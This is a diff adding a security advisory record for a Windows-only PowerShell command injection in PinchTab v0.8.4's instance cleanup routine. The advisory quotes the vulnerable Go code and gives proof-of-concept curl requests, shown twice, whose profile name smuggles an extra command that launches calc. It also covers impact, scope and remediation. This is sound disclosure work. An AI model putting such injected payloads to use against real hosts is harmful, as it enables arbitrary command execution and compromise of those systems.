@@ -1,0 +1,78 @@
+{
+  "id": "GHSA-p8mm-644p-phmh",
+  "modified": "2026-03-27T21:32:48.288546Z",
+  "published": "2026-03-24T19:46:39Z",
+  "aliases": [
+    "CVE-2026-33623",
+    "GO-2026-4823"
+  ],
+  "summary": "PinchTab: OS Command Injection via Profile Name in Windows Cleanup Routine Enables Arbitrary Command Execution",
+  "details": "### Summary\nPinchTab `v0.8.4` contains a Windows-only command injection issue in the orphaned Chrome cleanup path. When an instance is stopped, the Windows cleanup routine builds a PowerShell `-Command` string using a `needle` derived from the profile path. In `v0.8.4`, that string interpolation escapes backslashes but does not safely neutralize other PowerShell metacharacters.\n\nIf an attacker can launch an instance using a crafted profile name and then trigger the cleanup path, they may be able to execute arbitrary PowerShell commands on the Windows host in the security context of the PinchTab process user.\n\nThis is not an unauthenticated internet RCE. It requires authenticated, administrative-equivalent API access to instance lifecycle endpoints, and the resulting command execution inherits the permissions of the PinchTab OS user rather than bypassing host privilege boundaries.\n\n### Details\n**Issue 1 — PowerShell command string built with interpolated user-influenced data (`internal/bridge/cleanup_windows.go` in `v0.8.4`):**\n\n```\nfunc findPIDsByPowerShell(needle string) []int {\n    escaped := strings.ReplaceAll(needle, `\\`, `\\\\`)\n    cmd := exec.Command(\"powershell\", \"-NoProfile\", \"-Command\",\n        fmt.Sprintf(`Get-CimInstance Win32_Process -Filter \"Name='chrome.exe'\" | `+\n            `Where-Object { $_.CommandLine -like '*%s*' } | `+\n            `Select-Object -ExpandProperty ProcessId`, escaped))\n}\n```\n\nThe `needle` value is interpolated directly into a PowerShell command string. Escaping backslashes alone is not sufficient to make arbitrary user-controlled content safe inside a PowerShell expression.\n\n**Issue 2 — `needle` is derived from launchable profile names:**\n\nThe cleanup path uses:\n\n```\nfindPIDsByPowerShell(fmt.Sprintf(\"--user-data-dir=%s\", profileDir))\n```\n\nThe profile directory is derived from the instance/profile name used during launch. In `v0.8.4`, profile name validation rejected path traversal characters such as `/`, `\\`, and `..`, but it did not comprehensively block PowerShell metacharacters such as single quotes or statement separators.\n\n**Issue 3 — Trigger path is reachable through normal instance lifecycle APIs:**\n\nThe attack path described in the report uses:\n\n1. `POST /instances/launch` with a crafted `name`\n2. `POST /instances/{id}/stop` to trigger the cleanup routine\n\nThat means exploitability depends on access to privileged orchestration endpoints, not on local shell access.\n\n### PoC\n**Environment assumptions**\n\n- PinchTab `v0.8.4`\n- Windows host\n- Valid API token with access to instance lifecycle endpoints\n\n**Example sequence**\n\n```bash\ncurl -X POST http://HOST:9867/instances/launch \\\n  -H \"Authorization: Bearer \u003cTOKEN\u003e\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"name\": \"poc'\\''; Start-Process calc; $x='\\''\",\n    \"mode\": \"headless\"\n  }'\n```\n\nThen:\n\n```bash\ncurl -X POST http://HOST:9867/instances/\u003cINSTANCE_ID\u003e/stop \\\n  -H \"Authorization: Bearer \u003cTOKEN\u003e\"\n```\n\nIf the payload survives the launch path and reaches the vulnerable cleanup code, the injected PowerShell executes when the Windows cleanup routine runs.\n\n### Impact\n1. Arbitrary PowerShell command execution on Windows as the PinchTab process user.\n2. Full compromise of data and processes accessible to that user account.\n3. Possible persistence or host-level follow-on actions within the same user security context.\n4. Potential repeated execution in restart-heavy environments if the vulnerable cleanup path is triggered repeatedly.\n\n### Scope And Limits\n1. Windows only.\n2. Requires authenticated, administrative-equivalent API access to instance lifecycle endpoints.\n3. Does not by itself elevate beyond the privileges of the Windows user running PinchTab.\n4. This is stronger than a policy bypass or low-risk hardening gap, but narrower than unauthenticated remote code execution.\n\n### Suggested Remediation\n1. Do not interpolate user-influenced values into PowerShell `-Command` strings.\n2. Pass search terms through environment variables or structured arguments instead of code generation.\n3. Keep strict validation on profile names, but do not rely on input validation alone as the primary defense.\n4. Add regression tests covering PowerShell metacharacters in profile-derived values on Windows.\n\n\n\n\n### **Steps to Reproduce:**\n\n**Environment Setup:**\nTarget: PinchTab v0.8.4 (Windows build)\nPlatform: Windows only\n\n**1. Launch Instance with Malicious Profile Name**\n\n```\ncurl -X POST http://[server-ip]:9867/instances/launch \\\n  -H \"Authorization: Bearer \u003cTOKEN\u003e\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"name\": \"poc'\\''; Start-Process calc; $x='\\''\",\n    \"mode\": \"headless\"\n  }'\n```\n\n**2. Stop Instance to Trigger Injection**\n\n```\ncurl -X POST http://[server-ip]:9867/instances/\u003cINSTANCE_ID\u003e/stop \\\n  -H \"Authorization: Bearer \u003cTOKEN\u003e\"\n```\n\n### **Additional Observation — Repeated Execution (DoS Amplification)**\n\n**In environments where instances are automatically restarted (e.g., always-on mode), the cleanup routine is triggered repeatedly.**\n\nBecause the injection occurs during cleanup, the payload is executed on every restart cycle:\nContinuous spawning of calc.exe processes\nResource exhaustion\nSystem instability or crash\n\n### **Impact**\n\nThis vulnerability allows an authenticated attacker to execute arbitrary PowerShell commands on the Windows host running PinchTab. Impact - full host compromise including command execution, persistence, and data access; Root Cause - user-controlled input (profile name) is embedded into a PowerShell command without proper neutralization of special characters; Remediation - avoid constructing shell commands using string interpolation, enforce strict input validation (allowlist), and use structured command execution instead of powershell -Command.\n\nAdditionally, because the injection is triggered during the cleanup routine, environments with automatic instance restart behavior may repeatedly execute the injected payload, leading to uncontrolled process creation and resource exhaustion. This enables a reliable denial-of-service condition in addition to remote code execution.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/pinchtab/pinchtab/cmd/pinchtab",
+        "purl": "pkg:golang/github.com/pinchtab/pinchtab/cmd/pinchtab"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.8.5"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 0.8.4",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-p8mm-644p-phmh/GHSA-p8mm-644p-phmh.json"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/pinchtab/pinchtab",
+        "purl": "pkg:golang/github.com/pinchtab/pinchtab"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.8.5"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-p8mm-644p-phmh/GHSA-p8mm-644p-phmh.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/pinchtab/pinchtab/security/advisories/GHSA-p8mm-644p-phmh"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-33623"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/pinchtab/pinchtab/commit/25b3374bdcdf0dad32c44d5d726bf953238cd8bd"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/pinchtab/pinchtab"
+    }
+  ]
+}
